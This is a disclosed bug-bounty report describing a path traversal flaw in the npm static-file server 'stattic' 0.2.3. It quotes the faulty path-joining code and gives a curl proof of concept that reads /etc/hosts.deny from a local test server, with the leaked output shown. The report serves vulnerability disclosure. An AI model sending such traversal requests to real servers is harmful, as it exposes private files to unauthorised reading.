# [stattic] Inproper path validation leads to Path Traversal and allows to read arbitrary files with any extension(s)

## Report Details
- **Report ID**: 319003
- **URL**: https://hackerone.com/reports/319003
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-02-23T12:44:58.526Z
- **Disclosed**: 2018-03-06T22:04:34.271Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report Path Traversal in ```stattic``` module.
It allows to read content of some arbitrary files from the server where ```stattic``` is installed and run.

## Module

**module name:** stattic
**version:** 0.2.3
**npm page:** https://www.npmjs.com/package/stattic

### Module Description

Ridiculous simple script for serving static files using http module.

### Module Stats

Stats
7 downloads in the last day
32 downloads in the last week
77 downloads in the last month

~900 estimated downloads per year

## Vulnerability Description

Path Traversal vulnerability in ```stattic module``` allows to go up in directory tree and read content of some files outside of the root path set up in the module config.

However, this issue allows to read only files with extension, because if no extension is provided, ```stattic``` by default uses setting from ```options.index``` variable.

## Steps To Reproduce:

Install ```stattic``` module:

```
$ npm install stattic
```

Create sample application:

```javascript
// app.js
//Import libs
var stattic = require('stattic');
 
//Set the folder with the static files
stattic.set('folder', './');
 
//Set the port
stattic.set('port', 8080);
 
//Run the server
stattic.listen();
```

Run application:

```
$ node app.js
```

Here's the part of ```stattic``` code responsible for handling paths:

```javascript
// node_modules/stattic/index.js, line 70:

    //Parse the request url and get only the pathname
    var pathname = url.parse(req.url).pathname;

    //Resolve to the local folder
    var local_path = path.join(options.folder, pathname);

    //Check the extension
    if(path.extname(local_path) === '')
    {
      //Add the index file to the local path
      local_path = path.join(local_path, './' + path.basename(options.index));
    }

```

If file provided has no extension, ```/``` and ```options.index``` are added (by default, it will become ```/index.html```). This causes that eg. ```/etc/passwd``` path become ```/etc/passwd/index.html```, but ```/etc/hosts.deny``` is valid filename and can be read:

```
$ curl -v --path-as-is http://localhost:8080/../../../../../etc/hosts.deny
*   Trying ::1...
* Connected to localhost (::1) port 8080 (#0)
> GET /../../../../../etc/hosts.deny HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Content-Type: null
< Date: Fri, 23 Feb 2018 12:36:35 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
< 
# /etc/hosts.deny: list of hosts that are _not_ allowed to access the system.
#                  See the manual pages hosts_access(5) and hosts_options(5).
#
# Example:    ALL: some.host.name, .some.domain
#             ALL EXCEPT in.fingerd: other.host.name, .other.domain
#
# If you're going to protect the portmapper use the name "rpcbind" for the
# daemon name. See rpcbind(8) and rpc.mountd(8) for further information.
#
# The PARANOID wildcard matches any host whose name does not match its
# address.
#
# You may wish to enable this to ensure any programs that don't
# validate looked up hostnames still leave understandable logs. In past
# versions of Debian this has been the default.
# ALL: PARANOID

* Connection #0 to host localhost left intact
```

## Patch

Probably some protection against typical Path Traversal exploitation methods should be introduced here.

## Supporting Material/References:

- Operating system: Ubuntu 16.04
- Node.js 8.9.4
- npm v. 5.6.0
- curl 7.47.0

## Wrap up

- I contacted the maintainer to let him know: [N] 
- I opened an issue in the related repository: [N] 


Regards,

Rafal 'bl4de' Janicki

## Impact

Path Traversal vulnerability in ```stattic module``` allows to go up in directory tree and read content of some files outside of the root path set up in the module config.

## Attachments
No attachments
